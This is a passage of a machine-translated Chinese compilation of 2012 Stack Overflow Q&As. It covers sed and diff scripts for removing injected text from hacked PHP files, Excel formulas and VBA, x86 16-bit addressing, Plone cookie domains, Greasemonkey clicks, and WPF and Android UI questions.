find -name \*.php | xargs replace ${hacked} ""  -- 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:51:59.220

删除前置文本（假设前置文本中没有有用的内容）：

```
sed '/<marquee/,/marquee>/ d' index.php 
```

`/EXP1/, /EXP2/ d`表示 sed 匹配表达式 EXP1 和表达式 EXP2 之间的行，然后应用操作“d”（即“删除”）。

希望这可以帮助。

---- 根据下面的评论进行编辑 --- ---- 恶意代码中可能有正确的代码 ---- 您可以想象复制/粘贴要删除的文本部分到文本文件名 'tobedeleted 。文本文件'。然后编写以下脚本 process.sh （其中 $1 是要清理的文件）

```
#/bin/bash
diff --suppress-common-lines $1 tobedeleted.txt | grep -e '^<' | sed 's/^< //' 
```

上面的 diff 命令只显示参考恶意代码和文件 $1 的内容之间的差异。差值是逐行计算的，并在行前显示一个标记字符“<”（参见 参考资料`man diff`）。请先尝试此命令。

您可以调用脚本（`chmod u+x process.sh`首先使其可执行）并将结果重定向到另一个脚本，例如：

```
process.sh index.php > new_index.php 
```

因此，要更正大量文件，请执行以下脚本：

```
#/bin/bash
find . -name "*.php" | while read pathfile
do
   file=${pathfile##*/} # remove the path from the fullpath to the file
   pathonly=${pathfile%/*} # keep only the path
   cp $pathfile ${pathonly}/${file}.org # copy original file to save it, in case of...
   process.sh  ${pathonly}/${file}.org > ${pathfile} # apply correction
done 
```

# excel - 根据当前单元格上方的第一个特定文本字符串查找另一个单元格的内容

> ID：12646761
> 
> 赞同：0
> 
> 时间：2012-09-28T20:11:31.383
> 
> 标签：excel, excel-formula

我正在尝试提出一个可以在不同工作表中运行并引用以下数据的公式。

基本上对于 D 中的每个单元格，我想向上检查，当我找到字符串“发票”时，我选择上面的下一行和 B 列。基本上我每次都会找到公司名称。如您所见，每家公司的记录行数可能会有所不同。

更简单地说，该公式可以只对 B 列起作用，并直接返回字符串“Status”第一次出现的上方的字符串。

我不喜欢这有多复杂，但我无法控制我收到的数据格式，而且来源拒绝更改它。

**原始数据**

```
 A               B               C               D
1                   ABC Widgets, Inc.
2   Account         Status          Date            Invoice
3   1423            Open            4/25/2011       123748
4   1423            Closed          5/1/2011        432741
5   1423            Open            5/2/2011        522211
6 
7                   XYZ Sprockets, Inc.
8   Account         Status          Date            Invoice
9   3222            Open            5/3/2011        529999
10 
```

**完成数据**

```
 A               B               C               D            E
2   Account         Status          Date            Invoice      Client
3   1423            Open            4/25/2011       123748       ABC Widgets, Inc.
4   1423            Closed          5/1/2011        432741       ABC Widgets, Inc.
5   1423            Open            5/2/2011        522211       ABC Widgets, Inc.
9   3222            Open            5/3/2011        529999       XYZ Sprockets, Inc. 
```

纳奇，

虽然我无法让您的 VBA 代码正常工作（见评论），但它确实让我想出了这个代码，它找到了第一次出现的“状态”，然后偏移了上面的 1 个单元格。这本质上是我正在尝试的，但采用公式格式。

```
Sub findFirstStringAbove()
'
Cells.Find(What:="Status", After:=ActiveCell, LookIn:=xlFormulas, LookAt _
    :=xlPart, SearchOrder:=xlByRows, SearchDirection:=xlPrevious, MatchCase _
    :=False).Offset(-1, 0).Select
End Sub 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:27:34.230

试试这个公式，作为数组公式输入，即用++ `Ctrl`，然后复制下来。`Shift``Enter`

```
=INDEX(B:B,IF(ROW()>COUNTIF(B:B,"Status"),"",SMALL(IF($B:$B="Status",ROW($B:$B),2000000000),ROW()))-1) 
```

要从另一张纸上运行它，请从原始纸上**剪切**并粘贴它，它会自动调整参考。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:35:47.987

VBA 将为您提供比公式更快的答案，尽管不是动态的。运行过滤、偏移和复制结果的附加代码：

```
Dim lLastRow As Long, rgResult As Range

lLastRow = Cells(Rows.Count, 2).End(xlUp).Row

With Range("B1:B" & lLastRow)
    .AutoFilter field:=1, Criteria1:="Status"
    Set rgResult = .Offset(1).Resize(.Rows.Count - 1).SpecialCells(xlCellTypeVisible)
    .AutoFilter
End With

Sheets.Add

rgResult.Offset(-1).Copy ActiveSheet.Cells(1, 1) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T16:37:28.047

我讨厌拼图。至少，我是这么告诉人们的。

行。我将第一列作为您的标题。

```
A1 =    Account
B1 =    Status
C1 =    Date
D1 =    Invoice
E1 =    Client
F1 =    Index
G1 =    Client Index
H1 =    Client Cnt 
```

第 2 行将是您的数据的开始。

```
A2 =    =INDEX(Sheet1!A$1:A$1000,$F2)
B2 =    =INDEX(Sheet1!B$1:B$1000,$F2)
C2 =    =INDEX(Sheet1!C$1:C$1000,$F2)
D2 =    =INDEX(Sheet1!D$1:D$1000,$F2)
E2 =    =INDEX(Sheet1!B$1:B$1000,$G2)
F2 =    =IF(ISNUMBER(F1),IF(INDEX(Sheet1!B$1:B$1000,$F1+1)="",G2+2,F1+1),G2+2)
G2 =    {=IF(H2=H1,G1,SMALL(IF(Sheet1!$B$1:$B$1000="Status",ROW(Sheet1!$B$1:$B$1000),2000),H2)-1)}
H2 =    =IF(ISNUMBER(H1),IF(INDEX(Sheet1!B$1:B$1000,$F1+1)="",H1+1,H1),1) 
```

向下粘贴，直到出现#REF 错误。

Excel 对 $B:$B 语法产生了恶臭。它想要一个真实的范围。此外，您可能想要一个大于 1000 美元的数字。

毕竟，宏更直接且更适合此要求，但其中的乐趣是什么。

享受！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-29T17:13:13.910

好的。这是VBA。

```
Public Sub test()
Dim rngStCol As Range
Dim rngSt As Range
Dim lastRow As Integer
Dim rngDB As Range
Dim currRow As Integer

Set rngStCol = Sheet1.UsedRange.Columns(2)
Set rngSt = rngStCol.Find("Status")
Do While rngSt.Row > lastRow
    Set rngDB = rngSt.CurrentRegion
    Set rngDB = rngDB.Offset(2, 0).Resize(rngDB.Rows.Count - 2)

    If currRow = 0 Then
        Sheet3.Range(Sheet3.Cells(1, 1), Sheet3.Cells(1, rngDB.Columns.Count)).Value = rngDB.Offset(-1, 0).Resize(1).Value
        Sheet3.Cells(1, rngDB.Columns.Count + 1).Value = "Client"
        currRow = 2
    End If

    Sheet3.Range(Sheet3.Cells(currRow, 1), Sheet3.Cells(currRow + rngDB.Rows.Count - 1, rngDB.Columns.Count)).Value = rngDB.Value
    Sheet3.Range(Sheet3.Cells(currRow, rngDB.Columns.Count + 1), Sheet3.Cells(currRow + rngDB.Rows.Count - 1, rngDB.Columns.Count + 1)).Value = rngDB.Cells(-1, 2)

    currRow = currRow + rngDB.Rows.Count

    lastRow = rngSt.Row
    Set rngSt = rngStCol.FindNext(rngSt)
Loop

End Sub 
```

# xaml - 如何用可变高度元素填充 WinRT/XAML 段落？

> ID：12646762
> 
> 赞同：0
> 
> 时间：2012-09-28T20:11:37.693
> 
> 标签：xaml, windows-runtime, winrt-xaml, inlineuicontainer

假设我有一个包含 2 个段落的 RichTextBlock。第二段只是一些文字。第一段是一个 FlipView，其中包含像幻灯片一样的图像。我应该设置什么属性，`<Paragraph>`以便如果 FlipView 的图像具有不同的高度，第二段文本将移动到 FlipView 中图像的正下方堆叠？`<InlineUIContainer>``<FlipView>`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-08T03:58:30.763

我认为您不能使用 FlipView。

FlipView 将有一个矩形剪辑，以确保没有其他项目出现在视图框中。此视图框的尺寸（宽度/高度）基于您明确设置或由父容器选择的值。它们不会根据FlipView*中的图像而改变。*

# assembly - MOV BL,[AX] 错误

> ID：12646765
> 
> 赞同：0
> 
> 时间：2012-09-28T20:11:47.763
> 
> 标签：assembly, x86-16, systems-programming, microprocessors

> **可能重复：**
> [NASM 16bit Intel](https://stackoverflow.com/questions/12474010/nasm-16bit-intel)

我正在为微处理器课程中的简单微处理器编写汇编代码。我正在编写一个程序：将六个元素相加，从地址 300 开始存储在内存中，但忽略那些 80 hex 或以上（`>=80h`）或 20 hex 或以下（`<=20h`）的元素。在添加或不添加 6 次比较偶数后，程序应该停止。

这是我的代码：

```
 E 300 30 40 50 60 70 75
    A 100
100:MOV AX,2FF
103:ADD AX,1
106:CMP AX,306
109:JAE 11C
10B:MOV BL,[AX]
10E:CMP BL,20
111:JBE 103
113:CMP BL,80
116:JAE 103
118:ADD CL,BL
11A:JMP 103
11C:INT3 
```

但我在这一行收到一个错误：

```
10B:MOV BL,[AX] 
```

有谁知道为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T22:01:45.803

16 位寻址模式包含一个可选的偏移量、一个可选的基址寄存器 (bx, bp) 和一个可选的变址寄存器 (si, di)。而已！“[ax]”不在列表中。32 位寻址模式更灵活——任何通用寄存器都可以是基址，任何 GPR 但 esp 可以是索引——并且可以将 2、4 或 8 的“比例”乘以索引。学习了 32 位寻址模式的人很高兴忘记了 16 位寻址模式……显然有些人已经忘记了。:)

最好的，弗兰克

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:16:43.253

好吧，我不确定，但我猜您正在尝试将扩展 (aX) 寄存器的内容复制到另一个寄存器的低位 (bL) 中。

可能下半部分只是扩展后的一半大小......

# html - 封装HTML的渲染

> ID：12646770
> 
> 赞同：0
> 
> 时间：2012-09-28T20:12:25.953
> 
> 标签：html, asp.net-mvc, html-helper

有人可以解释一下当他们说：

“HTML Helpers 能够封装 HTML 的呈现”

这是否意味着它将限制对对象的 HTML 属性的访问？如果我使用 CSS、jquery、Javascript，它会在页面源代码中显示我的 JS/jquery 和 CSS 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:19:30.043

所谓“封装渲染”，就是指封装渲染html的功能。

如果您经常渲染一段常见的 html（例如 rails 表单助手），如果您插入代码（或助手中的代码构建功能），则每次需要渲染该 html（或它），您只需调用辅助方法，从而使您的代码保持“干燥”（在这种情况下为 html 代码）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:40:10.637

HTML 帮助程序是一些将呈现 HTML 的代码，而不是您直接在视图中为每条数据写出 HTML。

他们封装了它——这意味着他们负责输出 HTML。

# plone - 在用户注册时添加新的 cookie

> ID：12646773
> 
> 赞同：2
> 
> 时间：2012-09-28T20:12:30.663
> 
> 标签：plone

我正在使用 plone4.1 并希望在用户登录网站时为我的整个域 (.site.com) 创建一个 cookie。此 cookie 将被我域中的其他站点/应用程序读取。或者更改“__ac”以应用于域而不是 www.site.com。

我从其他问题中看到`setCookie(...)`会这样做。我想在成功登录时创建 cookie。哪里是这样做的好地方？

感谢您的帮助，我是克隆编程的新手。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T20:40:26.897

您可以在会话插件中设置域（控制`__ac`cookie）。

1.  通过站点设置控制面板进入 ZMI：
    ![ZMI链接](../Images/86d00d73e05c94e7bfb37c4fd82db55e.png)

2.  找到`acl_users`文件夹：
    ![acl_users 链接](../Images/8f4fd8b9e526f681d305d313817ff61d.png)

3.  这个文件夹里面是一个`session`对象：
    ![会话链接](../Images/f95b4ac2e2d94b5d7a1a172ec12beabe.png)

4.  这又具有一个`Properties`选项卡：
    ![属性选项卡](../Images/cbebf5f51cb539cd64f1b205c99554ab.png)

5.  在该选项卡上，有一个`Cookie domain`字段：
    ![Cookie 域字段](../Images/11886bd151c10f456bb907967800ac58.png)

在这里，填写您的`.site.com`域并点击`Save Changes`。

# javascript - 如何在 Greasemonkey 脚本中调用此链接？

> ID：12646774
> 
> 赞同：-1
> 
> 时间：2012-09-28T20:12:57.573
> 
> 标签：javascript, hyperlink, greasemonkey

目标 HTML：

```
 <a href="#" data-role="button" id="dispatchOnJobButton" data-theme="c" class="ui-btn ui-btn-corner-all ui-shadow ui-btn-up-c" data-disabled="false">
 <span class="ui-btn-inner ui-btn-corner-all" aria-hidden="true">
 <span class="ui-btn-text">Dispatch on next job
 </span>
 </span>
 </a> 
```

我尝试使用`document.getElementById("dispatchOnJobButton").click();`，但它似乎不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T01:57:00.977

单击此类链接的最可靠方法是发送鼠标事件，如下所示：

```
var targLink    = document.getElementById ("dispatchOnJobButton");
var clickEvent  = document.createEvent ('MouseEvents');
clickEvent.initEvent ('click', true, true);
targLink.dispatchEvent (clickEvent); 
```

* * *

这比任何其他方法更有效，但某些页面可能会触发鼠标悬停和鼠标按下（或以其他方式阻止大多数触发点击的尝试）。

如果上述方法不适用于您的目标页面，请链接到目标页面或发布完整的演示代码。

# java - 需要通过级联删除记录并希望它们通过hibernate存储在历史表中

> ID：12646779
> 
> 赞同：0
> 
> 时间：2012-09-28T20:13:43.830
> 
> 标签：java, hibernate

我需要从主表中删除记录并将其存储在历史表中（主表的精确副本），尽管我可以手动编码。但是他们是在休眠中实现相同的标准程序吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:25:16.653

看看[Hibernate Envers](http://www.jboss.org/envers)（[一个很好的教程](http://marakana.com/s/easy_auditing_versioning_for_your_hibernate_entities_with_envers,115/index.html)）。

# c# - 动态更改视频链接以获取最新视频

> ID：12646784
> 
> 赞同：0
> 
> 时间：2012-09-28T20:14:02.100
> 
> 标签：c#, html5-video, jquery-templates

我正在使用 jQuery 模板在我的网站上显示视频图块。问题是我想始终显示华尔街网站上的最新视频。视频按日期分组。

例如今天的视频：`src="http://m.wsj.net/video/20120928/092812hubammarkets/092812hubammarkets_320k.mp4"`

我想`src`根据今天的日期动态更改。

你知道怎么做吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:42:33.943

您可以只使用 DateTime 对象作为当前日期，然后将年、月、日期放入需要去的字符串中（如果字符串的其余部分始终不变）。

像这样的东西：

```
DateTime testDate = DateTime.Now;
string year = testDate.Year.ToString();
string month = testDate.ToString("MM");
string date = testDate.Day.ToString();
string yearTwoDigit = testDate.ToString("yy");
string source = "src=\u0022http://m.wsj.net/video/"+year+month+date+"/"+month+yearTwoDigit+"hubammarkets/"+month+date+yearTwoDigit+"hubammarkets_320k.mp4\u0022"; 
```

\u0022 是`"`字符

这是一个 C# 示例，它是您的标签之一。

# .net - 基于 .NET 4 构建的 Windows 窗体应用程序中的向后兼容性

> ID：12646786
> 
> 赞同：0
> 
> 时间：2012-09-28T20:14:09.790
> 
> 标签：.net, sql-server-2008, compatibility

我在 .NET 上使用 c# 构建了一个应用程序。我的软件将在装有 XP SP3 到 Win 7 的 PC 上运行。我研究确定使用哪个版本的 .NET 进行开发。Microsoft 网站明确表示 .NET 4 应用程序可以在 XP SP3 上运行。我信任他们，将应用程序构建到半个月，我刚刚进行了测试部署和 boooooom。它甚至没有启动并给出未安装所有所需组件的错误。我研究并无法安装 SQL Server 2008。

我做了以下事情： - 尝试在 XP SP3 上安装 .NET 4。轻松安装。但是无法安装 SQL Server express 2008（我的应用程序使用），它说要安装 .NET 2 - 如果我安装 .NET 2，我不确定该应用程序是否会在 Windows 7 上运行。

请帮忙。我的客户会杀了我！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:26:44.057

.NET 2.0 和 .NET 4.0 将并行运行而不会出现问题。事实上，Windows 7 预装了 .NET 2.0，尽管您可能需要[手动启用它](https://superuser.com/a/39629/27724)。

您可能希望针对您的错误发布更详细的问题，因为您尝试做的任何事情都不应该有任何无法克服的问题。例如，SQL Server 2008 Express[应该可以在 XP SP3 上正常工作](http://msdn.microsoft.com/en-us/library/ms143506%28v=sql.100%29.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:23:28.523

为 NET 2.0 编写的应用程序在 Windows7 中运行良好。
但是，我认为您应该检查您的应用程序是否真的需要 SqlServer 2008，而不是降级框架库。
也许您可以简单地降级以使用[SqlServer Express 2005](http://www.microsoft.com/en-us/download/details.aspx?id=21844)并重新创建数据库。
从您的编码可能性的角度来看，这将减少限制。

# c# - 以独立方式实例化和使用 MembershipProvider

> ID：12646787
> 
> 赞同：1
> 
> 时间：2012-09-28T20:14:12.770
> 
> 标签：c#, membership-provider

我的工作有多个应用程序，它们都有自己的 MembershipProviders；我们在大约十几个 Web 应用程序中使用了 3 个不同的。所以我有一个绝妙的想法，我将创建一个应用程序，通过在单个应用程序中分别实例化每个提供程序来集中管理身份和角色。

我为 MembershipProviders 创建了一个容器，并创建了一个包含所有参数信息和类定义的自定义配置部分。我能够很好地实例化类，并`Initialize()`使用`NameValueCollection`参数运行。这一切似乎一帆风顺。

但是，当我第一次尝试调用`GetAllUsers()`其中一个提供程序时，我收到了以下错误：

```
The membership provider name specified is invalid.
Parameter name: providerName 
```

提供名称；我正在为如何解决这个问题而摸不着头脑。有人可以给我任何帮助吗？

# javascript - 将 Html 返回到 XMLHttpRequest 对象

> ID：12646789
> 
> 赞同：2
> 
> 时间：2012-09-28T20:14:25.967
> 
> 标签：javascript

我正在对一个服务进行 ajax 调用，该服务使用此代码将 html 作为字符串返回..

```
var xhReq = new XMLHttpRequest();
xhReq.open("POST", "MobileClientService.svc/REST/TestHtmlSend", false);
xhReq.send(null);
xhReq.responseType = "text/html";
var serverResponse = xhReq.responseText;
alert(serverResponse); // Shows "15" 
```

该服务正确创建了html..

```
<div data-bb-type="item" data-bb-img="Images/imagesBBUI/icons/icon11.png" data-bb-title="Title From Server">

</div> 
```

问题是我的代码中的“serverResponse”正在返回这个..

```
<div data-bb-type=\"item\" data-bb-img=\"Images/imagesBBUI/icons/icon11.png\" data-bb-title=\"Title From Server\">
  \u000d\u000a\u000d\u000a
<\/div> 
```

这是用于创建 html 的 C# 代码。

```
 public string TestHtmlSend()
        {
            string moomoo = String.Empty;

            // Initialize StringWriter instance.
            StringWriter stringWriter = new StringWriter();

            // Put HtmlTextWriter in using block because it needs to call Dispose.
            using (HtmlTextWriter writer = new HtmlTextWriter(stringWriter))
            {
                //start collapse div
                writer.AddAttribute("data-bb-type", "item");
                writer.AddAttribute("data-bb-img", "Images/imagesBBUI/icons/icon11.png");
                writer.AddAttribute("data-bb-title", "Title From Server");
                writer.RenderBeginTag(HtmlTextWriterTag.Div);
                //writer.Write("Some Whatever Description");
                writer.RenderEndTag();

            }

            moomoo = stringWriter.ToString(); 
```

如何更改我的代码以返回没有所有额外“\”的html？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:29:11.450

我以前遇到过这样的奇怪问题，通常归结为中间件。

看起来像服务器端的变量插值问题。

您的中间件语言和/或框架是什么？

确保以干净的方式打印到输出流：

*   仅使用单个变量（您可以轻松地看到报价插值）
*   不要不必要地逃避你的输出

# javascript - 创建“模态”向下滑动 - 必须是最终用户无法选择其他任何内容的模态

> ID：12646794
> 
> 赞同：0
> 
> 时间：2012-09-28T20:15:06.390
> 
> 标签：javascript, jquery-ui, jquery, jquery-plugins

我正在尝试为页面创建一个“模态”向下滑动面板。我对创建幻灯片本身没有问题，它是我遇到问题的模态部分。

我玩过一些插件，例如 simplemodal 和 blockui，我已经弄清楚如何创建一个没有问题的模态弹出窗口，现在创建一个模态幻灯片....，我还没有完全弄清楚出去。

我怎样才能获得所需的信息？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:21:07.317

尝试使用 jQuery UI 的对话框。

```
$('#modal-content').dialog({ show: 'blind', modal: true}); 
```

# android - 在Android中加载压缩纹理ETC1

> ID：12646796
> 
> 赞同：3
> 
> 时间：2012-09-28T20:15:12.643
> 
> 标签：android, opengl-es, textures

我知道有 CompressedTextureActivity 示例，我的代码基于它，但我无法完成这项工作。在这里需要一些帮助：

```
public static int loadCompressedTexture(final Context context, final int resourceId){
        final int[] textureHandle = new int[1];
        GLES20.glGenTextures(1, textureHandle, 0);

        if (textureHandle[0] != 0){
            InputStream input = context.getResources().openRawResource(resourceId);

            GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureHandle[0]);

            GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MIN_FILTER, GLES20.GL_NEAREST);
            GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MAG_FILTER, GLES20.GL_LINEAR);

            try{
                ETC1Util.loadTexture(GLES20.GL_TEXTURE_2D, 0, 0,GLES20.GL_RGB, GLES20.GL_UNSIGNED_SHORT_5_6_5, input);
            }
            catch(IOException e){
                System.out.println("DEBUG! IOException"+e.getMessage());
            }
            finally{
                try {
                    input.close();
                } catch (IOException e) {
                    // ignore exception thrown from close.
                }
            }       
            //GLES20.glGenerateMipmap(GLES20.GL_TEXTURE_2D);

            checkGlError("");
        }
        else
            throw new RuntimeException("Error loading texture.");

        return textureHandle[0];
    } 
```

loadTexture 正在抛出一个 IOException，结果是黑色......

* * *

更新：我有没有标题的 pkm 文件。出于某种原因，我认为它们应该以这种方式编码，但现在我用标头对它们进行编码，并且不再出现 IOException 错误。顺便说一句，我用的是etc1tool，源png文件是2048x2048。

但是，我一直在变黑...

顺便说一句，这是我用来加载普通纹理的代码，它显示得很好：

```
public static int loadTexture(final Context context, final int resourceId)
{
    final int[] textureHandle = new int[1];

    GLES20.glGenTextures(1, textureHandle, 0);

    if (textureHandle[0] != 0)
    {
        final BitmapFactory.Options options = new BitmapFactory.Options();
        options.inScaled = false;   // No pre-scaling
        final Bitmap bitmap = BitmapFactory.decodeResource(context.getResources(), resourceId, options);

        GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, textureHandle[0]);

        GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MIN_FILTER, GLES20.GL_LINEAR_MIPMAP_NEAREST);
        GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MAG_FILTER, GLES20.GL_LINEAR);

        GLUtils.texImage2D(GLES20.GL_TEXTURE_2D, 0, bitmap, 0);

        GLES20.glGenerateMipmap(GLES20.GL_TEXTURE_2D);

        logHeap();

        bitmap.recycle();                       
    }

    if (textureHandle[0] == 0)
    {
        throw new RuntimeException("Error loading texture.");
    }

    return textureHandle[0];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-01T01:51:29.010

甚至以为我已经像这样设置了 mipmap：

```
GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MIN_FILTER, GLES20.GL_NEAREST);
GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MAG_FILTER, GLES20.GL_LINEAR); 
```

并且没有生成 mipmap，这 2 行代码在我的对象的 draw 方法中，天知道为什么。

```
GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MIN_FILTER,  GLES20.GL_LINEAR_MIPMAP_LINEAR);
GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_MAG_FILTER,  GLES20.GL_LINEAR); 
```

把它们拿出来解决了这个问题！

# wpf - 如何保持用户控制？

> ID：12646803
> 
> 赞同：6
> 
> 时间：2012-09-28T20:15:39.383
> 
> 标签：wpf, mvvm, keep-alive

我有与包含用户控件的 ContentControl 一起使用的向导项目。我在主窗口中通过 XAML 文件进行实例化：

```
 <DataTemplate DataType="{x:Type ViewModel:OpeningViewModel}">
        <view:OpeningView/>
   </DataTemplate>

    <DataTemplate DataType="{x:Type ViewModel:SecondUCViewModel}">
        <view:SecondUCView/>
    </DataTemplate> 
```

但是当我在 UC 之间导航时，似乎 UC 不像“保持活力”那样工作，每次 UC 切换都会创建新实例。我怎样才能避免它？我只想为每个 UC 创建一个实例，并且只在这些实例之间导航而不创建新实例。

我知道如何编写单例，但我的项目基于 MVVM，而且我对 WPF 很陌生，所以我不确定最好的方法是什么。

## 谢谢

更新：

这里是viewModel的代码：

在 viewModel 我有：

私有 ObservableCollection _pages = null; 私有 NavigationBaseViewModel _currentPage;

```
 #endregion

    #region Properties

    public int CurrentPageIndex
    {
        get
        {
            if (this.CurrentPage == null)
            {
                return 0;
            }
            return _pages.IndexOf(this.CurrentPage);
        }
    }

    public NavigationBaseViewModel CurrentPage
    {
        get { return _currentPage; }

        private set
        {
            if (value == _currentPage)
                return;

            _currentPage = value;
            OnPropertyChanged("CurrentPage");
        }
    } 
```

私人 ICommand _NavigateNextCommand；公共 ICommand NavigateNextCommand { get { if (_NavigateNextCommand == null) { _NavigateNextCommand = new RelayCommand(param => this.MoveToNextPage(), param => CanMoveToNextPage); } 返回 _NavigateNextCommand; } }

```
 private ICommand _NavigateBackCommand;
    public ICommand NavigateBackCommand
    {
        get
        {
            if (_NavigateBackCommand == null)
            {
                _NavigateBackCommand = new RelayCommand(param => this.MoveToPreviousPage(), param => CanMoveToPreviousPage);
            }
            return _NavigateBackCommand;
        }
    }

   private bool CanMoveToNextPage
    {
        get
        {
            return this.CurrentPage != null && this.CurrentPage.CanMoveNext;
        }
    }

    bool CanMoveToPreviousPage
    {
        get { return 0 < this.CurrentPageIndex && CurrentPage.CanMoveBack; }
    }

    private void MoveToNextPage()
    {
        if (this.CanMoveToNextPage)
        {
            if (CurrentPageIndex >= _pages.Count - 1)
                Cancel();
            if (this.CurrentPageIndex < _pages.Count - 1)
            {
                this.CurrentPage = _pages[this.CurrentPageIndex + 1];
            }
        }
    }

    void MoveToPreviousPage()
    {
        if (this.CanMoveToPreviousPage)
        {
            this.CurrentPage = _pages[this.CurrentPageIndex - 1];
        }
    } 
```

以及包含绑定到 CurrentPage 的 UC 的 ContentControl

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T10:01:50.277

You can do that by hardcoding the UserControls in XAML, instead of using DataTemplates. DataTemplates will create new Controls every time they are instantiated. However, since you use MVVM, you could also move all data you want persisted between the changes to the ViewModels, and make sure that the ViewModel objects are always the same. Then, the DataTemplates would still create new controls, but they would contain the same information as before.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-04T11:09:58.777

我最近在 MVVM 中遇到了同样的问题。基本上，我想缓存需要一段时间才能渲染的视图。如果您熟悉 ViewModelLocator，那么这种方法应该是直截了当的。

在客户端（例如 WPF）项目中，我创建了一个 ViewLocator 类，如下所示：

```
public class ViewLocator : ObservableObject
{
    #region Properties

    private View _myView;
    public View MyView
    {
        get { return _myView; }
        set { Set(() => MyView, ref _myView, value); }
    }

    #endregion Properties

    #region Constructors

    public ViewLocator()
    {
        RegisterViews();
    }

    #endregion Constructors

    #region Private Methods

    private void RegisterViews()
    {
        MyView = new View();
    }

    #endregion Private Methods
} 
```

为了在数据模板中使用它，我将 ViewLocator 指定为静态应用程序资源，因此只有一个实例被实例化——在我的例子中，我将它放在 App.xaml 中。要使用 ViewLocator 及其“视图”属性，我执行了以下操作：

```
<vl:ViewLocator x:Key="ViewLocator" />
<DataTemplate DataType="{x:Type vm:ViewModel}">
    <ContentControl Content="{Binding Source={StaticResource ViewLocator}, Path=MyView}" />
</DataTemplate> 
```

通过这样做，每个视图只被实例化一次并且可以被重用。

# android - Android：如何缩放画布以适合所需大小

> ID：12646805
> 
> 赞同：0
> 
> 时间：2012-09-28T20:15:43.160
> 
> 标签：android, android-canvas

我创建了这个类，它扩展了 View 并在 Canvas 中绘制了一个图形。在绘制图表时，我正在考虑实际的屏幕高度和宽度，并据此绘制图表。

我的问题是我将此视图用作另一个活动中的小部件，所需大小为 100 x 150 ..但视图类不会自行缩放，只显示它的剪裁部分而不是图形。我知道 O 必须做一些计算才能使这个画布适合所需的大小，但我不知道如何做到这一点..任何帮助都会很棒！

我正在绘制图形的代码是

```
 public class GraphPlotting extends View
    {
    public void onDraw(Canvas canvas)
{

    readPoints();
    Paint paint1 = new Paint();
    paint1.setColor(Color.rgb(0xFF,0xFF, 0xFF));
    paint1.setStrokeWidth(1.0f);

    Paint paint2 = new Paint();
    paint2.setColor(Color.rgb(0xFF,0xFF, 0xFF));
    paint2.setStrokeWidth(10.0f);

    Paint paint = new Paint();
    paint.setStyle(Paint.Style.FILL);
    paint.setColor(Color.RED);
    canvas.drawPaint(paint);

    canvas.drawLines(p,paint1);

}
    public void readPoints()
    {
          DisplayMetrics dm = new DisplayMetrics();
      getWindowManager().getDefaultDisplay().getMetrics(dm);

          height = dm.heightPixels;
      width = dm.widthPixels;

           // drawing graph based on above dimension which in my case is 480 by 800

    } 
```

我正在使用此视图的 xml 布局

```
 <RelativeLayout
android:layout_width="200dp"
android:layout_height="200dp"
android:orientation="vertical"
android:layout_below="@+id/btn_analyze"
android:layout_centerHorizontal="true"
android:id="@+id/rlgraph"
 >
<com.aventusoft.mylynel.GraphPlotting

        android:id="@+id/view1"
        android:layout_width="match_parent"
        android:layout_height="match_parent"

 />
</RelativeLayout> 
```

我想使我的画布适合我的相对布局高度和宽度，并且图形应该在该区域中可见..当前它显示视图但只有一部分..图形根本不可见..请帮助我计算我需要做..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T20:26:47.080

直接从我自己的一个类中复制/粘贴，该类扩展了 ImageView 以绘制图形。这个想法是你可以把它放到任何布局中。班级负责自己的测量。

```
@Override
protected void onSizeChanged(int w, int h, int oldw, int oldh) {

    widgetHeight = h;
    widgetWidth = w;

    if (sizeChangedObservers != null && sizeChangedObservers.size() > 0) {
        for (SizeChangedObserver observer : sizeChangedObservers) {
            observer.callback(w, h);
        }
    }

    updateIncrements();

} 
```

sizeChangedObservers 只是让我在图形大小发生变化时通知其他类，例如我在 X 和 Y 轴上有刻度指示器。updateIncrements() 是我使用设备屏幕分辨率、图形大小和 DPI 计数计算每个 X 和 Y 代表多少像素的地方。

使用这种方法，画布将是任何大小，你不在乎。绘图时，您只需使用 x * xPixels 和 y * yPixels，它们是每个值的计算像素。

[编辑] 尝试首先阅读[http://developer.android.com/training/custom-views/custom-drawing.html](http://developer.android.com/training/custom-views/custom-drawing.html)

# pdf - 从 truetype 字体文件中的表中提取信息

> ID：12646806
